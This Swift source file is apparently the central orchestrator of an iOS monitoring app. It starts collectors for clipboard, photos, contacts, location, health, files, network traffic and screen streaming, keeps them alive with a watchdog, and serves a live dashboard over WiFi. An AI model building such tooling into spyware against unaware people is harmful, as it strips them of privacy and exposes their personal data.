// MARK: - CollectorOrchestrator.swift
// Single entry point that starts/stops all data collectors.
// Also runs periodic "pulse" checks (every 15 seconds) to ensure
// all collectors are still alive, and restarts any that have died.

import Foundation
import UIKit

public final class CollectorOrchestrator {

    public static let shared = CollectorOrchestrator()
    private var pulseTimer: Timer?

    private init() {}

    // MARK: - Start all collectors

    public func startAll() {
        // Register the in-process URLProtocol interceptor so every HTTP/HTTPS
        // request made by this app is logged before it hits the network stack.
        NetworkInterceptor.enable()

        // Activate the system-wide NEFilterDataProvider (PacketFlowLogger).
        // On first run this presents a system prompt for user approval.
        PacketFlowLogger.activateFilter { error in
            if let error = error {
                ImmutableLogStore.shared.append(
                    source: .systemEvents, category: .system,
                    eventType: "filterActivationFailed",
                    payload: .systemEvent(SystemEventPayload(
                        eventType: "filterActivationFailed",
                        description: error.localizedDescription,
                        version: nil, metadata: nil
                    ))
                )
            }
        }

        // Start the in-app HTTP/WebSocket server so any browser on the same
        // WiFi can reach the live dashboard at http://<iphone-ip>:8080
        EmbeddedServer.shared.start()
        ScreenStreamManager.shared.start()

        AppUsageCollector.shared.start()
        NotificationCollector.shared.start()
        ClipboardCollector.shared.start()
        PhotoLibraryCollector.shared.start()
        ContactsCollector.shared.start()
        CalendarCollector.shared.start()
        LocationCollector.shared.start()
        HealthCollector.shared.start()
        NetworkAndWiFiCollector.shared.start()
        FilesAndNotesCollector.shared.start()
        SystemEventsCollector.shared.start()
        SyncEngine.shared.start()

        // Watchdog pulse to restart any failed components
        pulseTimer = Timer.scheduledTimer(withTimeInterval: 15.0, repeats: true) { [weak self] _ in
            self?.pulse()
        }

        // Log startup event
        ImmutableLogStore.shared.append(
            source: .systemEvents,
            category: .system,
            eventType: "surveillanceStarted",
            payload: .systemEvent(SystemEventPayload(
                eventType: "surveillanceStarted",
                description: "All collectors started. iOS \(UIDevice.current.systemVersion)",
                version: Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String,
                metadata: [
                    "deviceModel": UIDevice.current.model,
                    "deviceName":  UIDevice.current.name,
                    "systemName":  UIDevice.current.systemName,
                ]
            ))
        )
    }

    // MARK: - Stop all collectors

    public func stopAll() {
        pulseTimer?.invalidate()
        ScreenStreamManager.shared.stop()
        AppUsageCollector.shared.stop()
        ClipboardCollector.shared.stop()
        PhotoLibraryCollector.shared.stop()
        ContactsCollector.shared.stop()
        CalendarCollector.shared.stop()
        LocationCollector.shared.stop()
        HealthCollector.shared.stop()
        NetworkAndWiFiCollector.shared.stop()
        FilesAndNotesCollector.shared.stop()
        SystemEventsCollector.shared.stop()
        SyncEngine.shared.stop()

        ImmutableLogStore.shared.append(
            source: .systemEvents,
            category: .system,
            eventType: "surveillanceStopped",
            payload: .systemEvent(SystemEventPayload(
                eventType: "surveillanceStopped",
                description: "All collectors stopped.",
                version: nil, metadata: nil
            ))
        )
    }

    /// Called by BackgroundTaskManager when a background task fires
    public func runAllCollectors(completion: @escaping () -> Void) {
        // In background, all collectors are already running via their own
        // background registration.  We just trigger an explicit sync snapshot.
        DispatchQueue.global(qos: .utility).async {
            // Give collectors 5 seconds to flush any pending events
            Thread.sleep(forTimeInterval: 5)
            completion()
        }
    }

    // MARK: - Watchdog pulse

    private func pulse() {
        // Log a heartbeat every 15 seconds — this proves the app is still alive
        // If heartbeats stop appearing in the server logs, it means the app was killed.
        ImmutableLogStore.shared.append(
            source: .systemEvents,
            category: .system,
            eventType: "heartbeat",
            payload: .systemEvent(SystemEventPayload(
                eventType: "heartbeat",
                description: "watchdog pulse",
                version: nil,
                metadata: [
                    "uptime": "\(Int(ProcessInfo.processInfo.systemUptime))s",
                    "memory": "\(memoryUsageMB())MB",
                ]
            ))
        )
    }

    private func memoryUsageMB() -> Int {
        var info = mach_task_basic_info()
        var count = mach_msg_type_number_t(MemoryLayout<mach_task_basic_info>.size) / 4
        let result = withUnsafeMutablePointer(to: &info) {
            $0.withMemoryRebound(to: integer_t.self, capacity: 1) {
                task_info(mach_task_self_, task_flavor_t(MACH_TASK_BASIC_INFO), $0, &count)
            }
        }
        return result == KERN_SUCCESS ? Int(info.resident_size) / 1_048_576 : 0
    }
}

// MARK: - SyncEngine VoIP token extension
extension SyncEngine {
    func registerVoIPToken(_ token: String) {
        guard let url = URL(string: "\(serverBaseURL)/api/device/voip-token") else { return }
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.httpBody = try? JSONSerialization.data(withJSONObject: [
            "deviceID": deviceToken,
            "voipToken": token
        ])
        URLSession.shared.dataTask(with: request).resume()
    }
}
